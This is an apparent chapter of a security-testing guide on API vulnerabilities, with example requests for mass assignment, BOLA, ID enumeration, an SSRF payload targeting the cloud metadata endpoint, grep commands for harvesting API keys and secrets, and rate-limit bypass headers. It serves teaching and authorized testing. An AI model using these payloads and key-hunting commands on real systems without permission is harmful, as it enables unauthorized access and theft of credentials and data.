# API Security

Modern web applications are API-driven, making API security testing essential. APIs (especially REST and GraphQL) present unique attack surfaces compared to traditional web apps.

## REST API Security Issues

### Mass Assignment
When an API binds request data directly to internal objects without filtering.
```http
POST /api/users/create
{"username": "test", "password": "test123", "is_admin": true}

PUT /api/users/123/profile
{"name": "Test", "role": "admin"}
```

### Broken Object-Level Authorization (BOLA)
Accessing objects belonging to other users.
```http
GET /api/v1/users/456/profile
GET /api/v1/users/789/orders
```
This is the #1 API security risk per OWASP API Security Top 10.

### Broken Authentication
- Weak API key generation
- No expiration on tokens
- Tokens exposed in URLs
- Missing rate limiting on login

### Excessive Data Exposure
API returns more data than the client needs.
```http
GET /api/users/me
Response: { "username": "test", "email": "test@test.com",
            "credit_card": "4111-1111-1111-1111",
            "ssn": "123-45-6789", "internal_id": 42,
            "is_admin": true }
```

### Lack of Resources & Rate Limiting
No throttling on API endpoints.
```bash
# Brute-force user IDs
for i in $(seq 1 1000); do
    curl "https://target.com/api/users/$i/profile"
done
```

### Server-Side Request Forgery
API endpoints that fetch user-provided URLs.
```http
POST /api/fetch
{"url": "http://169.254.169.254/latest/meta-data/"}
```

## API Key & Token Hunting

### In JS Files
```bash
# Search for API keys in JS
cat all.js | grep -oP '["'"'"'][a-zA-Z0-9_]{20,40}["'"'"']' | sort -u
cat all.js | grep -E "(api_key|apiKey|apikey|API_KEY)" 
```

### In Mobile Apps
```
# Reverse engineer APK, search for API endpoints and keys
apktool d app.apk
grep -r "api" app/ | grep -E "(key|token|secret)"
```

### In URL Parameters
```bash
# Check for keys in URLs
cat urls.txt | grep -E "(key=|token=|api_key=|secret=|access_token=)"
```

## API Versioning Vulnerabilities

Older API versions often have fewer security controls.
```bash
# Try different versions
curl https://target.com/api/v1/users
curl https://target.com/api/v2/users
curl https://target.com/api/v3/users
curl https://target.com/api/internal/users
```

## API Rate Limiting Bypass

```bash
# Header-based bypass
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/login
curl -H "X-Real-IP: 10.0.0.1" https://target.com/api/login

# Accept header bypass
curl -H "Accept: application/vnd.target.v1+json" https://target.com/api/users
```

## Best Practices for API Security Testing

1. **Always check access controls** on every endpoint
2. **Try different HTTP methods** — GET, POST, PUT, PATCH, DELETE, OPTIONS
3. **Check error messages** — They may leak implementation details
4. **Test for mass assignment** — Try adding unexpected fields
5. **Check for API key leaks** — In JS, source maps, GitHub
6. **Test old API versions** — Often less secure
7. **Test with different Content-Type** — JSON, XML, form-encoded

## OWASP API Security Top 10

1. **API1:2023** — Broken Object Level Authorization (BOLA)
2. **API2:2023** — Broken Authentication
3. **API3:2023** — Broken Object Property Level Authorization
4. **API4:2023** — Unrestricted Resource Consumption
5. **API5:2023** — Broken Function Level Authorization
6. **API6:2023** — Unrestricted Access to Sensitive Business Flows
7. **API7:2023** — Server Side Request Forgery (SSRF)
8. **API8:2023** — Security Misconfiguration
9. **API9:2023** — Improper Inventory Management
10. **API10:2023** — Unsafe Consumption of APIs

---

> **Next**: [File Upload Vulnerabilities](10-file-upload.md)
